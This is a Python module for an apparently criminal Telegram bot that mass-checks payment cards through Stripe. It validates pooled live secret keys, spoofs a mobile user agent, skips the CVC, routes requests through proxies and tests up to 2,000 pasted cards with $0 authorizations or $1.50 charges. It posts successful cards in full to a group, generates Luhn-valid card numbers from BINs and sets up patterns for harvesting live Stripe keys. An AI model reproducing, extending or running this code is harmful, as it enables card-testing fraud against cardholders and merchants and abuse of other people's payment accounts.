from __future__ import annotations

import re
import json
import random
import asyncio
from typing import Any, Dict, List, Optional, Tuple
import os
import time
import logging

import aiohttp
from aiohttp import BasicAuth, TCPConnector
from pyrogram import filters
from pyrogram.types import Message

import os
import json
import stripe

from smart_proxy_bot import pm, app, load_keys, save_keys, notify_admins, notify_group, admin_only
from db import get_config, set_config


CARD_REGEX = re.compile(r"(\d{13,19}\|\d{1,2}\|\d{2,4})(?:\|(\d{3,4}))?")
MAX_CARDS = 20
MAX_CONCURRENT = 10
TOTAL_TIMEOUT_SECONDS = 25
UPDATE_THROTTLE_SECONDS = 3
MAX_CARDS_TXT = 1000
MAX_CONCURRENT_TXT = 32
MAX_CARDS_PMI_TXT = 2000
TXT_TASK_TIMEOUT_SECONDS = 60

KEY_HEALTH_INTERVAL = int(os.getenv("STRIPE_KEY_HEALTH_INTERVAL", "1800"))
AUTO_VALIDATE_DEFAULT = os.getenv("AUTO_VALIDATE_SKS", "1").lower() not in {"0", "false", "no", "off"}
MAX_CONCURRENT_KEY_CHECKS = int(os.getenv("STRIPE_KEY_HEALTH_CONCURRENCY", "6"))
STRIPE_HEALTH_AMOUNT = int(os.getenv("STRIPE_HEALTH_AMOUNT", "200"))
STRIPE_HEALTH_CURRENCY = os.getenv("STRIPE_HEALTH_CURRENCY", "usd")
CONFIG_KEY_AUTO_VALIDATE = "auto_validate_sks"

LOGGER = logging.getLogger("stripe_checker_bot")


_session: Optional[aiohttp.ClientSession] = None
_key_health_task: Optional[asyncio.Task] = None
_key_health_scan_task: Optional[asyncio.Task] = None
_key_health_lock = asyncio.Lock()
_auto_validate_enabled: Optional[bool] = None


def mask_card(card: str) -> str:
    if not isinstance(card, str):
        return ""
    parts = card.split("|")
    if not parts:
        return card
    number = parts[0]
    if len(number) <= 8:
        masked = number
    else:
        masked = f"{number[:6]}{'*' * max(0, len(number) - 10)}{number[-4:]}"
    return "|".join([masked, *parts[1:]])


async def _ensure_session() -> aiohttp.ClientSession:
    global _session
    if _session is None or _session.closed:
        timeout = aiohttp.ClientTimeout(total=TOTAL_TIMEOUT_SECONDS)
        _session = aiohttp.ClientSession(timeout=timeout, connector=TCPConnector(ssl=False))
    return _session


def is_auto_validate_enabled() -> bool:
    global _auto_validate_enabled
    if _auto_validate_enabled is None:
        stored = get_config(CONFIG_KEY_AUTO_VALIDATE, None)
        if stored is None:
            _auto_validate_enabled = AUTO_VALIDATE_DEFAULT
        else:
            _auto_validate_enabled = bool(stored)
    return _auto_validate_enabled


def set_auto_validate_enabled(enabled: bool) -> bool:
    global _auto_validate_enabled, _key_health_task, _key_health_scan_task
    previous = is_auto_validate_enabled()
    if previous == enabled:
        return False
    _auto_validate_enabled = enabled
    try:
        set_config(CONFIG_KEY_AUTO_VALIDATE, enabled)
    except Exception:
        pass
    if enabled:
        schedule_key_health_scan(delay=0.1, force=True)
    else:
        if _key_health_task and not _key_health_task.done():
            _key_health_task.cancel()
        if _key_health_scan_task and not _key_health_scan_task.done():
            _key_health_scan_task.cancel()
        _key_health_task = None
        _key_health_scan_task = None
    return True


async def _stripe_health_check(secret_key: str) -> Tuple[bool, str]:
    stripe.api_key = secret_key
    proxy_url = pm.build_url(pm.active()) if pm.active() else None
    if proxy_url:
        stripe.proxy = {"http": proxy_url, "https": proxy_url}
    else:
        stripe.proxy = None
    try:
        await asyncio.to_thread(stripe.Account.retrieve)
    except Exception as exc:  # noqa: PERF203
        return False, getattr(exc, "user_message", str(exc))

    try:
        await asyncio.to_thread(
            stripe.checkout.Session.create,
            mode="payment",
            payment_method_types=["card"],
            line_items=[{
                "price_data": {
                    "currency": STRIPE_HEALTH_CURRENCY,
                    "unit_amount": STRIPE_HEALTH_AMOUNT,
                    "product_data": {"name": "Health Check"},
                },
                "quantity": 1,
            }],
            success_url="https://example.com/success",
            cancel_url="https://example.com/cancel",
        )
    except Exception as exc:  # noqa: PERF203
        return False, getattr(exc, "user_message", str(exc))
    return True, ""


def _active_proxy_url() -> Optional[str]:
    name = pm.active()
    return pm.build_url(name) if name else None


async def _read_text_from_message(msg) -> str:
    # Read from replied document/text first; then own document/text
    if msg.reply_to_message and getattr(msg.reply_to_message, "document", None):
        path = None
        try:
            path = await msg.reply_to_message.download()
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return f.read()
        except Exception:
            pass
        finally:
            if path and os.path.exists(path):
                try:
                    os.unlink(path)
                except Exception:
                    pass
    if msg.reply_to_message and getattr(msg.reply_to_message, "text", None):
        return msg.reply_to_message.text
    if getattr(msg, "document", None):
        path = None
        try:
            path = await msg.download()
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return f.read()
        except Exception:
            pass
        finally:
            if path and os.path.exists(path):
                try:
                    os.unlink(path)
                except Exception:
                    pass
    return msg.text or ""


async def _remove_bad_key(secret_key: str, *, group: Optional[str] = None, reason: str = "api_key_expired") -> bool:
    """Remove an invalid SK from keys.json (within group if provided) and notify admins."""
    data = load_keys()
    removed_groups: List[str] = []
    targets = list(data.keys())
    for g in targets:
        arr = data.get(g) or []
        for idx, pair in enumerate(list(arr)):
            sk_val = pair.get("sk") or pair.get("secret_key")
            if sk_val == secret_key:
                arr.pop(idx)
                removed_groups.append(g)
    if removed_groups:
        save_keys(data)
        try:
            await notify_admins(
                f"⚠️ Removed Stripe SK ({reason}) from {', '.join(f'`{g}`' for g in removed_groups)}: `{secret_key[:12]}...`"
            )
        except Exception:
            pass
        return True
    return False


async def _validate_secret_key(secret_key: str) -> Tuple[bool, str]:
    """Call Stripe /v1/account to ensure the SK is live-mode and usable."""
    session = await _ensure_session()
    proxy = _active_proxy_url()
    try:
        async with session.get(
            "https://api.stripe.com/v1/account",
            auth=BasicAuth(secret_key, ""),
            proxy=proxy,
        ) as resp:
            try:
                data = await resp.json(content_type=None)
            except Exception:
                data = {}
            if resp.status == 401:
                return False, "api_key_expired"
            if resp.status >= 400:
                reason = (
                    (data.get("error") or {}).get("code")
                    if isinstance(data, dict)
                    else None
                )
                return False, reason or f"http_{resp.status}"
            if isinstance(data, dict):
                if not data.get("livemode", False):
                    return False, "testmode_charges_only"
                if not data.get("charges_enabled", True):
                    reason = data.get("charges_disabled_reason") or "charges_disabled"
                    if reason == "testmode_charges_only":
                        return False, reason
            return True, ""
    except Exception as exc:  # noqa: PERF203
        return False, type(exc).__name__


async def _run_key_validation_once() -> None:
    async with _key_health_lock:
        data = load_keys()
        if not data:
            return
        sem = asyncio.Semaphore(max(1, MAX_CONCURRENT_KEY_CHECKS))
        tasks: List[asyncio.Task] = []
        seen: set[str] = set()

        async def worker(secret_key: str, group_hint: str):
            async with sem:
                ok, reason = await _validate_secret_key(secret_key)
                if ok:
                    # extra health verification via Stripe SDK
                    sdk_ok, sdk_reason = await _stripe_health_check(secret_key)
                    if not sdk_ok:
                        await _remove_bad_key(secret_key, group=group_hint, reason=sdk_reason or "health_check_failed")
                    return
                if reason in {"api_key_expired", "testmode_charges_only"}:
                    await _remove_bad_key(secret_key, group=group_hint, reason=reason)
                else:
                    LOGGER.warning("Stripe key health check skipped removal for %s: %s", secret_key[:10], reason)

        for group, entries in data.items():
            for entry in entries:
                secret_key = entry.get("sk") or entry.get("secret_key")
                if not secret_key or secret_key in seen:
                    continue
                seen.add(secret_key)
                tasks.append(asyncio.create_task(worker(secret_key, group)))
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)


async def _key_health_loop():
    while True:
        try:
            await _run_key_validation_once()
        except Exception as exc:  # noqa: PERF203
            LOGGER.warning("Key health scan failed: %s", exc)
        await asyncio.sleep(KEY_HEALTH_INTERVAL)


def schedule_key_health_scan(delay: float = 0.0, *, force: bool = False) -> None:
    """Trigger a one-off health scan and ensure the periodic loop is running."""
    global _key_health_task, _key_health_scan_task
    if not is_auto_validate_enabled() and not force:
        return
    try:
        loop = app.loop
    except Exception:
        loop = asyncio.get_event_loop()

    if _key_health_task is None or _key_health_task.done():
        _key_health_task = loop.create_task(_key_health_loop())

    if _key_health_scan_task and not _key_health_scan_task.done():
        if not force:
            return
        _key_health_scan_task.cancel()

    async def _delayed_scan():
        if delay > 0:
            await asyncio.sleep(delay)
        await _run_key_validation_once()

    _key_health_scan_task = loop.create_task(_delayed_scan())


def extract_decline_code_and_advice(body_text: str) -> Tuple[str, str, Optional[Dict[str, Any]]]:
    try:
        body = json.loads(body_text)
    except Exception:
        return ("Unknown error", "No advice", None)

    err = body.get("error") or body
    decline_code: Optional[str] = None
    advise_code: Optional[str] = None

    if isinstance(err, dict):
        decline_code = (
            err.get("decline_code")
            or err.get("code")
            or err.get("error")
            or err.get("message")
        )
        advise_code = err.get("failure_code") or err.get("advice") or err.get("message")
        if isinstance(err.get("error"), dict):
            adv = err.get("error")
            advise_code = advise_code or (
                adv.get("failure_code")
                or adv.get("decline_code")
                or adv.get("code")
                or adv.get("message")
            )

    if not decline_code:
        decline_code = "Unknown error"
    if not advise_code:
        advise_code = "No advice"

    return (decline_code, advise_code, body if isinstance(body, dict) else None)


async def create_source_with_pk(publishable_key: str, card_data: str, owner_email: Optional[str] = None) -> Dict[str, Any]:
    parts = card_data.split("|")
    number, exp_month, exp_year = parts[:3]
    cvc = parts[3] if len(parts) > 3 else ""

    url = "https://api.stripe.com/v1/sources"
    payload = {
        "type": "card",
        "card[number]": number,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "key": publishable_key,
        "payment_user_agent": "stripe-android/20.48.0;PaymentSheet",
        "card[tokenization_method]": random.choice(["google"]),
    }
    # Do not send CVC; it's optional and not required.
    if owner_email:
        payload["owner[email]"] = owner_email

    session = await _ensure_session()
    proxy = _active_proxy_url()
    async with session.post(url, data=payload, proxy=proxy) as resp:
        text = await resp.text()
        if resp.status == 200:
            return await resp.json()
        decline_code, advise_code, _ = extract_decline_code_and_advice(text)
        return {"error": decline_code, "advise": advise_code}


async def create_customer_with_source(secret_key: str, source_id: str) -> Dict[str, Any]:
    url = "https://api.stripe.com/v1/customers"
    payload = {"source": source_id}
    session = await _ensure_session()
    proxy = _active_proxy_url()
    async with session.post(url, data=payload, auth=BasicAuth(secret_key, ""), proxy=proxy) as resp:
        text = await resp.text()
        if resp.status == 200:
            return await resp.json()
        decline_code, advise_code, _ = extract_decline_code_and_advice(text)
        return {"error": decline_code, "advise": advise_code}


async def create_and_confirm_setup_intent_with_source(secret_key: str, customer_id: str, source_id: str) -> Dict[str, Any]:
    create_url = "https://api.stripe.com/v1/setup_intents"
    create_payload = {"customer": customer_id, "payment_method_types[]": "card"}
    session = await _ensure_session()
    proxy = _active_proxy_url()
    async with session.post(create_url, data=create_payload, auth=BasicAuth(secret_key, ""), proxy=proxy) as resp:
        text = await resp.text()
        if resp.status != 200:
            decline_code, advise_code, _ = extract_decline_code_and_advice(text)
            return {"error": decline_code, "advise": advise_code}
        si = await resp.json()

    confirm_url = f"https://api.stripe.com/v1/setup_intents/{si['id']}/confirm"
    confirm_payload = {"payment_method": source_id}
    async with session.post(confirm_url, data=confirm_payload, auth=BasicAuth(secret_key, ""), proxy=proxy) as resp:
        text = await resp.text()
        if resp.status == 200:
            return await resp.json()
        decline_code, advise_code, _ = extract_decline_code_and_advice(text)
        return {"error": decline_code, "advise": advise_code}


# ---------- PaymentIntent ($1.50) Flow (PMI) ----------
async def create_payment_intent(secret_key: str) -> Dict[str, Any]:
    url = "https://api.stripe.com/v1/payment_intents"
    payload = {"amount": 150, "currency": "usd", "payment_method_types[]": "card"}
    session = await _ensure_session()
    proxy = _active_proxy_url()
    async with session.post(url, data=payload, auth=BasicAuth(secret_key, ""), proxy=proxy) as resp:
        text = await resp.text()
        if resp.status == 200:
            return await resp.json()
        decline_code, advise_code, _ = extract_decline_code_and_advice(text)
        return {"error": decline_code, "advise": advise_code}


async def confirm_payment_intent(pi: Dict[str, Any], card_data: str, publishable_key: str) -> Dict[str, Any]:
    try:
        parts = card_data.split("|")
        number, exp_month, exp_year = parts[:3]
        cvc = parts[3] if len(parts) >= 4 else ""
    except Exception:
        return {"error": "Invalid format"}

    url = f"https://api.stripe.com/v1/payment_intents/{pi['id']}/confirm"
    payload = {
        "source_data[type]": "card",
        "source_data[card][number]": number,
        "source_data[card][exp_month]": exp_month,
        "source_data[card][exp_year]": exp_year,
        "source_data[card][tokenization_method]": "google",
        "key": publishable_key,
        "client_secret": pi.get("client_secret", ""),
        "source_data[payment_user_agent]": "stripe-android/20.48.0;PaymentSheet",
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    session = await _ensure_session()
    proxy = _active_proxy_url()
    async with session.post(url, data=payload, headers=headers, proxy=proxy) as resp:
        text = await resp.text()
        if resp.status == 200:
            return await resp.json()
        decline_code, advise_code, _ = extract_decline_code_and_advice(text)
        return {"error": decline_code, "advise": advise_code}


async def run_card_pmi(card_data: str, group_keys: List[Dict[str, str]], group: Optional[str] = None) -> Tuple[str, str]:
    """Charge $1.50 via PI flow. Auto-switch SK on api_key_expired."""
    tried: set[str] = set()
    local_keys = list(group_keys)
    while True:
        candidates = [p for p in local_keys if (p.get("sk") or p.get("secret_key")) not in tried]
        if not candidates:
            return (card_data, "❌ declined | no_valid_keys")
        pair = random.choice(candidates)
        secret_key = pair.get("sk") or pair.get("secret_key")
        publishable_key = pair.get("pk") or pair.get("publishable_key")
        tried.add(secret_key)

        pi = await create_payment_intent(secret_key)
        if not pi or "id" not in pi:
            decline = pi.get("error", "PI creation failed") if isinstance(pi, dict) else "PI creation failed"
            if isinstance(pi, dict):
                reason = pi.get("error")
                if reason in {"api_key_expired", "testmode_charges_only"}:
                    await _remove_bad_key(secret_key, group=group, reason=reason)
                    local_keys = _resolve_group_keys(group or "")
                    continue
            return (card_data, f"❌ declined | {decline}")

        conf = await confirm_payment_intent(pi, card_data, publishable_key)
        if isinstance(conf, dict):
            if conf.get("status") == "succeeded":
                # Log to group when charged
                try:
                    await notify_group(f"✅ CHARGED | `{card_data}`")
                except Exception:
                    pass
                return (card_data, "✅ CHARGED")
            reason = conf.get("error") or conf.get("status")
            if reason in {"api_key_expired", "testmode_charges_only"}:
                await _remove_bad_key(secret_key, group=group, reason=reason)
                local_keys = _resolve_group_keys(group or "")
                continue
        decline = conf.get("error", conf.get("status", "Unknown")) if isinstance(conf, dict) else "Unknown"
        return (card_data, f"❌ declined | {decline}")

async def run_card(card_data: str, group_keys: List[Dict[str, str]], message, sem: asyncio.Semaphore, group: Optional[str] = None) -> None:
    async with sem:
        local_keys = list(group_keys)
        tried: set[str] = set()
        while True:
            candidates = [p for p in local_keys if (p.get("sk") or p.get("secret_key")) not in tried]
            if not candidates:
                await message.reply_text(
                    f"CC: `{card_data}`\nStatus: ❌ declined\nDecline: no_valid_keys\nAdvice: No advice\nGate: Authorization SI $0"
                )
                return
            pair = random.choice(candidates)
            secret_key = pair.get("sk") or pair.get("secret_key")
            publishable_key = pair.get("pk") or pair.get("publishable_key")
            tried.add(secret_key)

            src = await create_source_with_pk(publishable_key, card_data)
            if not src or "id" not in src:
                decline = src.get("error", "Unknown") if isinstance(src, dict) else "Unknown"
                advise = src.get("advise", "No advice") if isinstance(src, dict) else "No advice"
                await message.reply_text(
                    f"CC: `{card_data}`\nStatus: ❌ declined\nDecline: {decline}\nAdvice: {advise}\nGate: Authorization SI $0"
                )
                return

            source_id = src["id"]
            cust = await create_customer_with_source(secret_key, source_id)
            if not cust or "id" not in cust:
                decline = cust.get("error", "Unknown") if isinstance(cust, dict) else "Unknown"
                advise = cust.get("advise", "No advice") if isinstance(cust, dict) else "No advice"
                if isinstance(cust, dict):
                    reason = cust.get("error")
                    if reason in {"api_key_expired", "testmode_charges_only"}:
                        await _remove_bad_key(secret_key, group=group, reason=reason)
                        local_keys = _resolve_group_keys(group or "")
                        continue
                await message.reply_text(
                    f"CC: `{card_data}`\nStatus: ❌ declined\nDecline: {decline}\nAdvice: {advise}\nGate: Authorization SI $0"
                )
                return

            customer_id = cust["id"]
            si = await create_and_confirm_setup_intent_with_source(secret_key, customer_id, source_id)
            if isinstance(si, dict) and si.get("status") == "succeeded":
                try:
                    await notify_group(f"✅ AUTH | `{card_data}` | Gate: Authorization SI $0")
                except Exception:
                    pass
                await message.reply_text(f"CC: `{card_data}`\nStatus: ✅ SUCCEEDED\nGate: Authorization SI $0")
                return
            decline = si.get("error", "Unknown") if isinstance(si, dict) else "Unknown"
            advise = si.get("advise", "No advice") if isinstance(si, dict) else "No advice"
            if isinstance(si, dict):
                reason = si.get("error")
                if reason in {"api_key_expired", "testmode_charges_only"}:
                    await _remove_bad_key(secret_key, group=group, reason=reason)
                    local_keys = _resolve_group_keys(group or "")
                    continue
            await message.reply_text(
                f"CC: `{card_data}`\nStatus: ❌ declined\nDecline: {decline}\nAdvice: {advise}\nGate: Authorization SI $0"
            )
            return


def _parse_cards(text: str) -> List[str]:
    cards = [m.group(0) for m in CARD_REGEX.finditer(text or "")]
    return cards[:MAX_CARDS]


def _resolve_group_keys(group: str) -> List[Dict[str, str]]:
    data = load_keys()
    if group and group in data and data[group]:
        return data[group]
    # fallback to any group
    for g, arr in data.items():
        if arr:
            return arr
    return []


def register_stripe_handlers(app_instance):
    # ---------- Utility: CC generator ----------
    def _luhn_checksum(number: str) -> int:
        total = 0
        parity = (len(number) + 1) % 2
        for i, ch in enumerate(number):
            d = ord(ch) - 48
            if i % 2 == parity:
                d *= 2
                if d > 9:
                    d -= 9
            total += d
        return total % 10

    def _complete_luhn(bin_prefix: str) -> str:
        # pad with random digits until length 15, then compute last digit
        import random as _rnd
        base = bin_prefix
        while len(base) < 15:
            base += str(_rnd.randint(0, 9))
        for _ in range(max(1, 19 - len(base))):
            if len(base) >= 15:
                break
            base += str(_rnd.randint(0, 9))
        checksum = _luhn_checksum(base + "0")
        check_digit = (10 - checksum) % 10
        return base + str(check_digit)

    def _rand_exp() -> tuple[str, str]:
        import random as _rnd, time as _t
        month = f"{_rnd.randint(1,12):02d}"
        year = _t.gmtime().tm_year % 100
        year = f"{_rnd.randint(max(24, year), min(35, year + 12)):02d}"
        return month, year

    def _rand_cvc() -> str:
        import random as _rnd
        return f"{_rnd.randint(100,999)}"

    @app_instance.on_message(filters.command("ccgen"))
    async def cmd_ccgen(client, message):
        # Usage: /ccgen BIN COUNT [MM|YY] [CVC]
        # BIN can contain X wildcards to randomize
        try:
            parts = (message.text or "").split()
            if len(parts) < 3:
                return await message.reply_text("📌 Usage: `/ccgen BIN COUNT [MM|YY] [CVC]`\nExample: `/ccgen 414720XXXXXX 20`", disable_web_page_preview=True)
            _, binpat, count_s, *rest = parts
            count = max(1, min(200, int(count_s)))
            mm = yy = cvc = None
            if rest:
                try:
                    mm, yy = rest[0].split("|")[:2]
                except Exception:
                    mm = yy = None
            if len(rest) >= 2:
                cvc = rest[1]

            import random as _rnd
            numbers = []
            for _ in range(count):
                base = ''.join(str(_rnd.randint(0,9)) if ch in {'x','X'} else ch for ch in binpat)
                base = re.sub(r"\D", "", base)
                if len(base) < 6:
                    continue
                num = _complete_luhn(base[:15]) if len(base) <= 15 else base[:16]
                em, ey = (mm, yy) if mm and yy else _rand_exp()
                cv = cvc or _rand_cvc()
                numbers.append(f"{num}|{em}|{ey}|{cv}")
            if not numbers:
                return await message.reply_text("❌ Invalid BIN pattern.")
            txt = "\n".join(numbers)
            if len(txt) > 3500:
                # send as file
                path = ".data/ccgen.txt"
                import os
                os.makedirs(".data", exist_ok=True)
                with open(path, "w", encoding="utf-8") as f:
                    f.write(txt)
                await client.send_document(message.chat.id, path, caption=f"✅ Generated {len(numbers)} cards")
            else:
                await message.reply_text(f"✅ Generated {len(numbers)} cards:\n```
{txt}
```", disable_web_page_preview=True)
        except Exception as e:
            await message.reply_text(f"❌ Error: {type(e).__name__}")
    @app_instance.on_message(filters.command("check"))
    async def cmd_check(client, message):
        # format: /check GROUP then CC lines in message or reply
        text_source = message.reply_to_message.text if message.reply_to_message else message.text
        parts = text_source.split(maxsplit=1)
        group = None
        remaining_text = text_source
        if len(parts) >= 2 and parts[0].lower().startswith("/check"):
            group = parts[1].splitlines()[0].strip()
            remaining_text = "\n".join(parts[1].splitlines()[1:])

        cards = _parse_cards(remaining_text)
        if not cards:
            return await message.reply_text("No valid cards found. Format: `4111111111111111|MM|YY[|CVC]`")

        keys = _resolve_group_keys(group)
        if not keys:
            return await message.reply_text("No Stripe keys available. Add with /addsk SK PK GROUP")

        sem = asyncio.Semaphore(MAX_CONCURRENT)
        session = await _ensure_session()
        try:
            tasks = [run_card(c, keys, message, sem, group) for c in cards]
            await asyncio.gather(*tasks)
        finally:
            await message.reply_text("✅ Done processing!")

    @app_instance.on_message(filters.command("pmi"))
    async def cmd_pmi(client, message):
        # format: /pmi GROUP then CC lines in message or reply
        text_source = message.reply_to_message.text if message.reply_to_message else message.text
        parts = text_source.split(maxsplit=1)
        group = None
        remaining_text = text_source
        if len(parts) >= 2 and parts[0].lower().startswith("/pmi"):
            group = parts[1].splitlines()[0].strip()
            remaining_text = "\n".join(parts[1].splitlines()[1:])

        cards = _parse_cards(remaining_text)
        if not cards:
            return await message.reply_text("No valid cards found. Format: `4111111111111111|MM|YY[|CVC]`")

        keys = _resolve_group_keys(group)
        if not keys:
            return await message.reply_text("No Stripe keys available. Add with /addsk SK PK GROUP")

        header = "💳 **PaymentIntent $1.50**\n`━━━━━━━━━━━━━━━━━━━━`\n"
        lines = [f"🟡 `{c}` → **Pending...**" for c in cards]
        status_msg = await message.reply_text(header + "\n".join(lines))

        sem = asyncio.Semaphore(MAX_CONCURRENT)

        async def worker(c: str) -> Tuple[str, str]:
            async with sem:
                try:
                    return await run_card_pmi(c, keys, group)
                except Exception as e:
                    return (c, f"❌ error | {type(e).__name__}")

        tasks = [worker(c) for c in cards]
        results: Dict[str, str] = {c: "🟡 Pending" for c in cards}
        done_count = 0
        total = len(tasks)

        last_edit_ts = 0.0
        loop = asyncio.get_event_loop()
        for coro in asyncio.as_completed(tasks):
            card, res = await coro
            done_count += 1
            results[card] = res
            try:
                ordered = []
                for c in cards:
                    line_val = res if c == card else results[c]
                    if line_val.startswith("✅"):
                        ordered.append(f"✅ `{c}` → **CHARGED**")
                    elif line_val.startswith("❌"):
                        reason = line_val.split("|", 1)[1].strip() if "|" in line_val else "declined"
                        ordered.append(f"❌ `{c}` → `{reason}`")
                    else:
                        ordered.append(f"🟡 `{c}` → **Pending...**")
                now = loop.time()
                if (now - last_edit_ts) >= UPDATE_THROTTLE_SECONDS or done_count == total:
                    await status_msg.edit_text(
                        f"💳 **PaymentIntent $1.50**\n`━━━━━━━━━━━━━━━━━━━━`\n"
                        f"🚀 **Progress:** `{done_count}/{total}`\n" + "\n".join(ordered),
                        disable_web_page_preview=True,
                    )
                    last_edit_ts = now
            except Exception:
                pass

        charged_cards: List[str] = []
        declined_cards: List[Tuple[str, str]] = []
        for c in cards:
            res = results.get(c, "")
            if isinstance(res, str) and res.startswith("✅"):
                charged_cards.append(c)
            else:
                reason = res.split("|", 1)[1].strip() if isinstance(res, str) and "|" in res else "declined"
                declined_cards.append((c, reason))

        summary_lines: List[str] = []
        summary_lines.append("💳 **PaymentIntent $1.50**")
        summary_lines.append("`━━━━━━━━━━━━━━━━━━━━`")
        summary_lines.append(f"🚀 **Progress:** `{total}/{total}`")
        summary_lines.append("`━━━━━━━━━━━━━━━━━━━━`")
        summary_lines.append("**Charged Cards ✅:**")
        if charged_cards:
            for c in charged_cards:
                summary_lines.append(f"- `{c}`")
        else:
            summary_lines.append("- `None`")
        summary_lines.append("")
        summary_lines.append("**Declined ❌:**")
        if declined_cards:
            for c, reason in declined_cards:
                summary_lines.append(f"- `{c}` → `{reason}`")
        else:
            summary_lines.append("- `None`")

        await status_msg.edit_text("\n".join(summary_lines), disable_web_page_preview=True)

    @app_instance.on_message(filters.command("mstxt"))
    async def cmd_mstxt(client, message):
        """Mass .txt check for authorized cards only (max 1000)."""
        parts = (message.text or "").split(maxsplit=1)
        group = parts[1].splitlines()[0].strip() if len(parts) >= 2 else None

        text = await _read_text_from_message(message)
        cards = _parse_cards(text)
        if not cards:
            return await message.reply_text("No valid cards found. Format: `4111111111111111|MM|YY[|CVC]`")
        if len(cards) > MAX_CARDS_TXT:
            cards = cards[:MAX_CARDS_TXT]

        keys = _resolve_group_keys(group or "")
        if not keys:
            return await message.reply_text("No Stripe keys available. Add with /addsk SK PK GROUP")

        header = "🧰 **Mass TXT Check (Authorized Only)**\n`━━━━━━━━━━━━━━━━━━━━`\n"
        progress = await message.reply_text(header + f"🚀 **Progress:** `0/{len(cards)}`")

        sem = asyncio.Semaphore(MAX_CONCURRENT_TXT)
        results: Dict[int, bool] = {i: False for i in range(len(cards))}

        async def _single_card(i: int, c: str):
            async with sem:
                local_keys = list(keys)
                tried: set[str] = set()
                while True:
                    candidates = [p for p in local_keys if (p.get("sk") or p.get("secret_key")) not in tried]
                    if not candidates:
                        results[i] = False
                        return
                    pair = random.choice(candidates)
                    secret_key = pair.get("sk") or pair.get("secret_key")
                    publishable_key = pair.get("pk") or pair.get("publishable_key")
                    tried.add(secret_key)

                    src = await create_source_with_pk(publishable_key, c)
                    if not src or "id" not in src:
                        results[i] = False
                        return
                    source_id = src["id"]
                    cust = await create_customer_with_source(secret_key, source_id)
                    if not cust or "id" not in cust:
                        if isinstance(cust, dict):
                            reason = cust.get("error")
                            if reason in {"api_key_expired", "testmode_charges_only"}:
                                await _remove_bad_key(secret_key, group=group, reason=reason)
                                local_keys = _resolve_group_keys(group or "")
                                continue
                        results[i] = False
                        return
                    customer_id = cust["id"]
                    si = await create_and_confirm_setup_intent_with_source(secret_key, customer_id, source_id)
                    if isinstance(si, dict) and si.get("status") == "succeeded":
                        results[i] = True
                        return
                    if isinstance(si, dict):
                        reason = si.get("error")
                        if reason in {"api_key_expired", "testmode_charges_only"}:
                            await _remove_bad_key(secret_key, group=group, reason=reason)
                            local_keys = _resolve_group_keys(group or "")
                            continue
                    results[i] = False
                    return

        async def worker(i: int, c: str):
            try:
                await asyncio.wait_for(_single_card(i, c), timeout=TXT_TASK_TIMEOUT_SECONDS)
            except asyncio.TimeoutError:
                results[i] = False

        tasks = [worker(i, c) for i, c in enumerate(cards)]
        done = 0
        loop = asyncio.get_event_loop()
        last_edit = 0.0
        for coro in asyncio.as_completed(tasks):
            await coro
            done += 1
            try:
                now = loop.time()
                if (now - last_edit) >= UPDATE_THROTTLE_SECONDS or done == len(cards):
                    await progress.edit_text(header + f"🚀 **Progress:** `{done}/{len(cards)}`", disable_web_page_preview=True)
                    last_edit = now
            except Exception:
                pass

        authorized = [cards[i] for i, ok in results.items() if ok]
        lines: List[str] = []
        lines.append("🧰 **Mass TXT Check (Authorized Only)**")
        lines.append("`━━━━━━━━━━━━━━━━━━━━`")
        lines.append(f"✅ Authorized: `{len(authorized)}` / `{len(cards)}`")
        if authorized:
            lines.append("\n**Authorized Cards ✅:**")
            for c in authorized:
                lines.append(f"- `{c}`")
        await progress.edit_text("\n".join(lines), disable_web_page_preview=True)

    @app_instance.on_message(filters.command("mxtxt"))
    async def cmd_mxtxt(client, message):
        """Mass PMI .txt charge check (max 2000)."""
        parts = (message.text or "").split(maxsplit=1)
        group = parts[1].splitlines()[0].strip() if len(parts) >= 2 else None

        text = await _read_text_from_message(message)
        cards = _parse_cards(text)
        if not cards:
            return await message.reply_text("No valid cards found. Format: `4111111111111111|MM|YY[|CVC]`")
        if len(cards) > MAX_CARDS_PMI_TXT:
            cards = cards[:MAX_CARDS_PMI_TXT]

        keys = _resolve_group_keys(group or "")
        if not keys:
            return await message.reply_text("No Stripe keys available. Add with /addsk SK PK GROUP")

        header = "💳 **PMI Mass Check ($1.50)**\n`━━━━━━━━━━━━━━━━━━━━`\n"
        progress = await message.reply_text(header + f"🚀 **Progress:** `0/{len(cards)}`")

        sem = asyncio.Semaphore(MAX_CONCURRENT_TXT)
        results: Dict[str, str] = {c: "🟡 Pending" for c in cards}

        async def _one(c: str) -> tuple[str, str]:
            async with sem:
                try:
                    return await asyncio.wait_for(run_card_pmi(c, keys, group), timeout=TXT_TASK_TIMEOUT_SECONDS)
                except asyncio.TimeoutError:
                    return (c, "❌ error | timeout")
                except Exception as e:
                    return (c, f"❌ error | {type(e).__name__}")

        tasks = [_one(c) for c in cards]
        done = 0
        loop = asyncio.get_event_loop()
        last_edit = 0.0
        for coro in asyncio.as_completed(tasks):
            card, res = await coro
            results[card] = res
            done += 1
            try:
                now = loop.time()
                if (now - last_edit) >= UPDATE_THROTTLE_SECONDS or done == len(cards):
                    await progress.edit_text(header + f"🚀 **Progress:** `{done}/{len(cards)}`", disable_web_page_preview=True)
                    last_edit = now
            except Exception:
                pass

        charged_cards = [c for c, r in results.items() if isinstance(r, str) and r.startswith("✅")]
        declined_cards = [(c, r.split("|", 1)[1].strip() if isinstance(r, str) and "|" in r else (r or "declined")) for c, r in results.items() if c not in charged_cards]

        summary_lines: List[str] = []
        summary_lines.append("💳 **PMI Mass Check ($1.50)**")
        summary_lines.append("`━━━━━━━━━━━━━━━━━━━━`")
        summary_lines.append(f"🚀 **Progress:** `{len(cards)}/{len(cards)}`")
        summary_lines.append("`━━━━━━━━━━━━━━━━━━━━`")
        summary_lines.append("**Charged Cards ✅:**")
        if charged_cards:
            for c in charged_cards:
                summary_lines.append(f"- `{c}`")
        else:
            summary_lines.append("- `None`")
        summary_lines.append("")
        summary_lines.append("**Declined ❌:**")
        if declined_cards:
            for c, reason in declined_cards:
                summary_lines.append(f"- `{c}` → `{reason}`")
        else:
            summary_lines.append("- `None`")

        await progress.edit_text("\n".join(summary_lines), disable_web_page_preview=True)

    # ---------- Mass add keys from text ----------
    SK_RE = re.compile(r"sk_live_[A-Za-z0-9]+")
    PK_RE = re.compile(r"pk_live_[A-Za-z0-9]+")

